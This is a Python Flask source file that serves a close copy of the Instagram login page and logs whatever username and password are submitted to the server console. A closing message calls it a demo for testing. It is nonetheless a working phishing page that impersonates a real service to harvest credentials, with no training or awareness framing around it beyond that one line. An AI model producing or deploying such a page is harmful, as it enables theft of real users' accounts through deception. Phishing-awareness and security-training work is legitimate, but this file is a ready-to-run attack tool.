from flask import Flask, request

app = Flask(__name__)

html_code = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; }

        .instagram-logo {
            height: 51px;
            width: 175px;
            background-image: url('/static/instagram-logo.png');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
        }

        .facebook-logo {
            height: 16px;
            width: 16px;
            background-image: url('/static/fb.png');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
        }

        .apple-store-logo {
            height: 42px;
            width: 128px;
            background-image: url('/static/apple-button.png');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
        }

        .google-store-logo {
            height: 42px;
            width: 130px;
            background-image: url('/static/googleplay-button.png');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
        }
    </style>
</head>
<body>
<div class="h-screen bg-gray-50 flex flex-col justify-center items-center">
    <div class="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
        <div class="instagram-logo mb-6"></div>
        <form class="w-64 flex flex-col" action="/" method="POST">
            <input class="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2"
                   name="username_or_email" placeholder="Phone number, username, or email" type="text" required>
            <input class="text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2"
                   name="password" placeholder="Password" type="password" required>
            <button type="submit" class="text-sm text-center bg-blue-500 text-white py-1 rounded font-medium">
                Log In
            </button>
        </form>
        <div class="flex justify-evenly space-x-2 w-64 mt-4">
            <span class="bg-gray-300 h-px flex-grow"></span>
            <span class="text-xs text-gray-400 font-semibold">OR</span>
            <span class="bg-gray-300 h-px flex-grow"></span>
        </div>
        <button class="mt-4 flex items-center">
            <div class="facebook-logo mr-1"></div>
            <span class="text-xs text-blue-900 font-semibold">Log in with Facebook</span>
        </button>
        <a class="text-xs text-blue-900 mt-4 cursor-pointer">Forgot password?</a>
    </div>
    <div class="bg-white border border-gray-300 text-center w-80 py-4">
        <span class="text-sm">Don't have an account?</span>
        <a class="text-blue-500 text-sm font-semibold" href="#">Sign up</a>
    </div>
    <div class="mt-3 text-center">
        <span class="text-xs">Get the app</span>
        <div class="flex mt-3 space-x-2">
            <div class="apple-store-logo"></div>
            <div class="google-store-logo"></div>
        </div>
    </div>
</div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        username = request.form.get('username_or_email')
        password = request.form.get('password')

        print("\n🔐 New Login Attempt (Demo):")
        print(f"📛 Username/Email: {username}")
        print(f"🔑 Password: {password}")
        print("-" * 40)

        return "<h2>This was a demo form. Data captured for testing only. 🚫 Not real login!</h2>"

    return html_code

if __name__ == '__main__':
    app.run(debug=True)
